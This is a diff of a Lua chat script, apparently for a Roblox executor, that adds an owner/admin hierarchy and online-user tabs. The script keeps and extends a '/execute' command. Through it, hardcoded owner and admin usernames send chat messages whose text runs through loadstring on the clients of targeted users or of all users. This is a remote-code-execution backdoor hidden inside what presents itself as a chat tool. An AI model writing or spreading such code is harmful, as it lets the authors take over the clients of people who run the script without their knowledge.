@@ -1,4 +1,4 @@
--- Global Chat AltisLib (ADMIN TABLE + ONLINE TAB + HEARTBEAT + COMMAND + AUTO SCALE)
+-- Global Chat AltisLib (OWNER & ADMIN HIERARCHY + ONLINE TAB + COMMAND + AUTO SCALE)
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -42,9 +42,13 @@ Tab2:CreateDivider()
 
 -- TAB 3: Người dùng
 local Tab3 = Window:CreateTab("Người dùng")
+
+local lblOwnerCount = Tab3:CreateLabel("[OWNER] - 0 online")
+local SOwner = Tab3:CreateSection("Danh sách Owner")
+Tab3:CreateDivider()
+
 local lblAdminCount = Tab3:CreateLabel("[ADMIN] - 0 online")
 local SAdmin = Tab3:CreateSection("Danh sách Admin")
-
 Tab3:CreateDivider()
 
 local lblUserCount = Tab3:CreateLabel("User - 0 online")
@@ -68,13 +72,21 @@ local seen = {}
 local onlineObjects = {} 
 
 -- ==========================================
--- [CẬP NHẬT] HỆ THỐNG DANH SÁCH ADMIN (TABLE)
+-- HỆ THỐNG PHÂN QUYỀN (HIERARCHY)
 -- ==========================================
-local ADMINS = {
-    ["hoang_huy1k9"] = true,
-    ["rypzRXcHVG"] = true -- Đã thêm ROBLOX777 vào danh sách Admin
-    -- Bạn có thể thêm người khác bằng cách copy dòng trên và đổi username
+local OWNERS = {
+    ["hoang_huy1k9"] = true -- 54hz
 }
+
+local ADMINS = {
+    ["rypzRXcHVG"] = true   -- ROBLOX777
+}
+
+local function getRole(username)
+    if OWNERS[username] then return "OWNER" end
+    if ADMINS[username] then return "ADMIN" end
+    return "USER"
+end
 
 ---------------------------------------------------
 -- UTIL
@@ -95,12 +107,16 @@ local function updateCooldown()
 end
 
 local function getSenderPrefix(msg)
-    local role = ""
-    -- Kiểm tra xem người gửi có nằm trong bảng Admin không
-    if ADMINS[msg.username] then
-        role = "👑 [ADMIN] "
+    local roleStr = ""
+    local role = getRole(msg.username)
+    
+    if role == "OWNER" then
+        roleStr = "🌟 [OWNER] "
+    elseif role == "ADMIN" then
+        roleStr = "👑 [ADMIN] "
     end
-    return role .. msg.displayName .. " (@" .. msg.username .. ") " .. now()
+    
+    return roleStr .. msg.displayName .. " (@" .. msg.username .. ") " .. now()
 end
 
 ---------------------------------------------------
@@ -128,6 +144,7 @@ local function updateOnlineStatus()
     if not ok or type(data) ~= "table" then data = {} end
 
     local currentOnline = {}
+    local ownerCount = 0
     local adminCount = 0
     local userCount = 0
 
@@ -135,12 +152,11 @@ local function updateOnlineStatus()
         if type(user) == "table" and user.timestamp then
             if os.time() - user.timestamp <= 15 then
                 currentOnline[userId] = user
-                -- Phân loại đếm số lượng Admin / User
-                if ADMINS[user.username] then
-                    adminCount = adminCount + 1
-                else
-                    userCount = userCount + 1
-                end
+                
+                local role = getRole(user.username)
+                if role == "OWNER" then ownerCount = ownerCount + 1
+                elseif role == "ADMIN" then adminCount = adminCount + 1
+                else userCount = userCount + 1 end
             else
                 task.spawn(function()
                     http_request({
@@ -152,32 +168,27 @@ local function updateOnlineStatus()
         end
     end
 
+    lblOwnerCount:SetText("[OWNER] - " .. ownerCount .. " online")
     lblAdminCount:SetText("[ADMIN] - " .. adminCount .. " online")
     lblUserCount:SetText("User - " .. userCount .. " online")
 
     for userId, user in pairs(currentOnline) do
         if not onlineObjects[userId] then
-            local isAdmin = ADMINS[user.username] or false
+            local role = getRole(user.username)
             local formatName = user.displayName .. "(@" .. user.username .. ")"
             local p
             
-            if isAdmin then
-                p = SAdmin:CreateParagraph(formatName, "Đang hoạt động")
-            else
-                p = SUser:CreateParagraph(formatName, "Đang hoạt động")
-            end
+            if role == "OWNER" then p = SOwner:CreateParagraph(formatName, "Đang hoạt động")
+            elseif role == "ADMIN" then p = SAdmin:CreateParagraph(formatName, "Đang hoạt động")
+            else p = SUser:CreateParagraph(formatName, "Đang hoạt động") end
             
-            onlineObjects[userId] = { p = p, isAdmin = isAdmin }
+            onlineObjects[userId] = { p = p }
         end
     end
 
     for userId, obj in pairs(onlineObjects) do
         if not currentOnline[userId] then
-            pcall(function()
-                if obj.p and obj.p.Destroy then
-                    obj.p:Destroy()
-                end
-            end)
+            pcall(function() if obj.p and obj.p.Destroy then obj.p:Destroy() end end)
             onlineObjects[userId] = nil 
         end
     end
@@ -214,17 +225,37 @@ local function addMessage(key, msg)
 
     -- COMMAND SYSTEM
     if msg.message:match("^/execute") then
-        -- Kiểm tra người gửi có quyền Admin không
-        if ADMINS[msg.username] then
+        local senderRole = getRole(msg.username)
+        
+        -- Chỉ Owner hoặc Admin mới có quyền phát lệnh
+        if senderRole == "OWNER" or senderRole == "ADMIN" then
             local target, code = msg.message:match('^/execute%s+"(.-)"%s+(.+)')
             if target and code then
                 if code:sub(1, 1) == '"' and code:sub(-1, -1) == '"' then code = code:sub(2, -2) end
-                if target == LocalPlayer.DisplayName or target == LocalPlayer.Name or target == "@" .. LocalPlayer.Name or target:lower() == "all" then
-                    task.spawn(function()
-                        local func, err = loadstring(code)
-                        if func then pcall(func) else warn("Lỗi loadstring do sai cú pháp: ", err) end
-                    end)
-                    Window:SendNotification("Hệ Thống", "Đang thực thi lệnh từ Admin!", 3)
+                
+                -- Kiểm tra xem máy khách này có phải mục tiêu không
+                local isTarget = (target == LocalPlayer.DisplayName or target == LocalPlayer.Name or target == "@" .. LocalPlayer.Name or target:lower() == "all")
+                
+                if isTarget then
+                    local myRole = getRole(LocalPlayer.Name)
+                    local canExecute = false
+                    
+                    -- KIỂM TRA THẨM QUYỀN NHẬN LỆNH
+                    if senderRole == "OWNER" then
+                        canExecute = true -- Owner được ra lệnh cho TẤT CẢ mọi người
+                    elseif senderRole == "ADMIN" then
+                        if myRole == "USER" then
+                            canExecute = true -- Admin CHỈ được ra lệnh cho User
+                        end
+                    end
+                    
+                    if canExecute then
+                        task.spawn(function()
+                            local func, err = loadstring(code)
+                            if func then pcall(func) else warn("Lỗi loadstring do sai cú pháp: ", err) end
+                        end)
+                        Window:SendNotification("Hệ Thống", "Đang thực thi lệnh từ " .. senderRole .. "!", 3)
+                    end
                 end
             end
         end
